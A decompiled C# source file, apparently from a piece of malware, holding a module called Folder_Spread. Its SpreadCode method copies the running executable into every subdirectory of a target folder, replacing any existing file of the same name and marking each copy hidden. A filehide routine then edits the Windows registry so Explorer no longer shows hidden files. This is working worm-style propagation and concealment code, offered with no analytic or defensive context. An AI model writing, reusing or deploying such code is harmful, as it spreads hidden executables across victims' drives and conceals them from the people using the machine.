using System.IO;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using WindowsApplication35.My;

namespace WindowsApplication35;

[StandardModule]
internal sealed class Folder_Spread
{
	public static string SpreadCode(object location)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(Conversions.ToString(location));
		string text = "";
		DirectoryInfo[] directories = directoryInfo.GetDirectories();
		foreach (DirectoryInfo directoryInfo2 in directories)
		{
			text = directoryInfo2.FullName;
			if (File.Exists(text + "\\" + Module1.exen))
			{
				File.Delete(text + "\\" + Module1.exen);
				File.Copy(Application.get_ExecutablePath(), text + "\\" + Module1.exen);
				File.SetAttributes(text + "\\" + Module1.exen, FileAttributes.Hidden);
			}
			else
			{
				File.Copy(Application.get_ExecutablePath(), text + "\\" + Module1.exen);
				File.SetAttributes(text + "\\" + Module1.exen, FileAttributes.Hidden);
			}
		}
		filehide();
		return text;
	}

	public static void filehide()
	{
		((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", (object)0);
	}
}
